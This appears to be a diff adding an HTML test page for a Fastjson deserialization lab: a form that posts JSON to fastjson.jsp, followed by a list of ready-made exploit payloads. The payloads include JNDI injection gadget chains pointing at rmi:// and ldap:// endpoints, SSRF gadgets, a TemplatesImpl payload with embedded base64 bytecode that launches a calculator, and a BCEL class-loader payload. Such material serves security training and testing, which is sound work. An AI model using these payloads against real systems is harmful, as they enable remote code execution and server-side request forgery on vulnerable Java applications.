@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>FastJson upload</title>
+</head>
+<body>
+<form action="fastjson.jsp" enctype="application/json" method="post">
+    JsonString: <input name="json" type="text" style="width:1000px;height:20px"/>
+
+    <input name="submit" type="submit" value="Submit"/>
+    <br/>
+</form>
+<br/>
+<h3>基于 JNDI 进行反序列化漏洞执行：</h3>
+*{"@type":"com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"rmi://127.0.0.1:1099/Object","autoCommit":true}<br>
+*[{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://localhost:43658/Calc","autoCommit":true}]<br>
+*[{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:43657/Calc","autoCommit":true}]<br>
+*{"@type":"org.apache.xbean.propertyeditor.JndiConverter","asText":"ldap://localhost:43658/Calc"}<br>
+*{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://localhost:43658/Calc"}<br>
+*{"@type":"com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://localhost:43658/Calc"}<br>
+*{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://localhost:43658/Calc"}<br>
+*{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://localhost:43658/Calc"}<br>
+{"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"ldap://localhost:43658/Calc","Object":"a"}<br>
+{"@type":"org.apache.cocoon.components.slide.impl.JMSContentInterceptor", "parameters":
+{"@type":"java.util.Hashtable","java.naming.factory.initial":"com.sun.jndi.rmi.registry.RegistryContextFactory","topic-factory":"ldap://127.0.0.1:43658/Calc"},
+"namespace":""}<br>
+{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","healthCheckRegistry":"ldap://localhost:43658/Calc"}<br>
+{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties":
+{"@type":"java.util.Properties","UserTransaction":"ldap://localhost:43658/Calc"}}<br>
+
+
+<h3>进行 SSRF 攻击</h3>
+<span>{"@type":"org.apache.cxf.jaxrs.model.wadl.WadlGenerator","schemaLocations": "http://127.0.0.1:23234?id=1"}</span>
+<br/>
+<span>{"@type":"org.apache.cxf.jaxrs.utils.schemas.SchemaHandler","schemaLocations": "http://127.0.0.1:23234?id=2"}</span>
+<br/>
+<span>{"@type":"org.apache.commons.jelly.impl.Embedded","script": "http://127.0.0.1:23234?id=3"}</span>
+<br/>
+<span>{"@type":"javax.swing.JEditorPane","page": "http://127.0.0.1:23234?id=4"}</span>
+<br/>
+
+
+<h3>基于 TemplatesImpl 进行反序列化漏洞执行：</h3>
+<span>{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADIANwoACAAnCgAoACkIACoKACgAKwcALAoABQAnBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMU1UxODsBAApFeGNlcHRpb25zBwAvAQAJdHJhbnNmb3JtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAwAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQBAAZMVGVzdDsHADEBAApTb3VyY2VGaWxlAQAJU1UxOC5qYXZhDAAJAAoHADIMADMANAEAFm9wZW4gLWEgQ2FsY3VsYXRvci5hcHAMADUANgEABFRlc3QBAARTVTE4AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAcACAAAAAAABAABAAkACgACAAsAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIADAAAAA4AAwAAAAoABAALAA0ADAANAAAADAABAAAADgAOAA8AAAAQAAAABAABABEAAQASABMAAQALAAAASQAAAAQAAAABsQAAAAIADAAAAAYAAQAAAA8ADQAAACoABAAAAAEADgAPAAAAAAABABQAFQABAAAAAQAWABcAAgAAAAEAGAAZAAMAAQASABoAAgALAAAAPwAAAAMAAAABsQAAAAIADAAAAAYAAQAAABIADQAAACAAAwAAAAEADgAPAAAAAAABABQAFQABAAAAAQAbABwAAgAQAAAABAABAB0ACQAeAB8AAgALAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgAMAAAACgACAAAAFAAIABUADQAAABYAAgAAAAkAIAAhAAAACAABACIAIwABABAAAAAEAAEAJAABACUAAAACACY="],'_name':'a.b','_tfactory':{ },"_outputProperties":{ },"_name":"a","_version":"1.0","allowedProtocols":"all"}</span>
+<br>
+<h3>基于 ClassLoader 进行反序列化漏洞执行：</h3>
+<span>{"@type":"org.jboss.util.loading.ContextClassLoaderSwitcher","contextClassLoader":{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"a":{"@type":"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$Q$fe$ce$deZJq$97$C$a2$e0$F$Qq$Xe$eb$V$_$m$8a$Lh$b2h$8c$r$90$V$ff$9c$z$tP$ed$b6$b5$3d$cb$e5Q$7c$C$S$ff$n$J$Q$8d$3e$80$Pe$9c6$h$40$dc$3fg$ce$f9$e6$9b$99o$a6$d3$df$7f$be$ff$Cp$l$af4$f4aT$c1u$N$v$8cv$d01$a6$e2Fl$8b$wJ$g$c6qS$83$8e$5b$w$sb$5bV$60$aa$b8$ad$e2$8e$8a$bb$w$eei$94$e2A$7cL$wx$a8$a1$H$8f$U$3cf$c8$c9$8dP$f05$Gc$f1$p$df$e4$a6$cb$bdus$v$c1$a6$Y$d2v$e3$8c$cb$92$a1$e3$ad$93$x7$edx$8e$9c$nN$b1$b4$cc$90$a9$f8k$82$n$bf$e8x$e2M$b3Q$X$e1$S$af$bb$84$a8$d3$b6$dbbvY$92$db$9f$5e$f3$mq$vxBJ$Y4$cbo$86$b6Xpbv$87$d8t$dcr$5cN$c7$A$G$J$98$T$N$df$8cQ$j$e7$d1$cf0$ec$H$c2$h2g$83$c0ul$$$j$df$8b$cc$Kw$ed$a6$cb$a5$l$96y$Q$e8$b8$80$8b$M$8a$l$95$3d$de$a0$3aS$3a$a6$f1T$c7$M$9e$91$dc$z$c7$d3$f1$i$b3$M$85$b3mQ$Q5$5c$W$db$a4$qe$daT$dd$ac$3b$9eY$e7$d1$G$B$T$b6$82$X$3a$w$98$d31$8f$F$86$9e$93$f8$f9m$5b$E$b1$Y$j$_c$d9$85$b3$c3$q$f6j$bb1$9e$d6$b0$TI$d1$60$e8$5c$X$f2mHm$86r$87a$ac$f8$7fX$a9$5d$a6N$e9$_$fa$5b$o$ac$f0$88$e4$f7$W$db$92T$db$f7$qw$bc$88a$f0t$e2$ca$G$P$z$f1$b9$v$3c$5bL$95$de3t$9f$f8$de5$3d$e94$u$a7F$c2$8e$l$7d$ff$Uh$c1T$nC$d3$a3$c9$V$8bm$da$3d$jA$j$da$o$8a$u$o$l$90S$s$bb$b1$Ur$5b$60$98v$ba$8fv$3e$F$z$fe$e6t$d3$e2O$9a$m$y$5e$L$3a$_$d1$eb2YF6$3b$7e$I$b6G$XF$Q$90K$c04T$5c9$a6$7eE$sA$3f$fc$40$aav$88$f4$3e2Fv$l9C9$82z$80$OC$3b$40$e7$X$M$e4$7eB$af$a5$8d$$$ab$961$ceY$b5$ec7$e4$ac$5d$f4$b7$e0$7c$M$XZp$f5$I$dd$e3$H0Vv$a1V$e9$d2$bbG$V$f2$b0$b0L$3fW$wQ2B$g$40$955d$c9$a3$a1$8a$$$f2w$T$p$8f$V$U$b0J$cc$ab$c4$d0$91$99$b4$U$MU$V$M$c7$3aG$92V$af$fd$F$N$5c$a2N$fb$D$A$A"}}</span>
+
+<br>
+
+
+</body>
+</html>
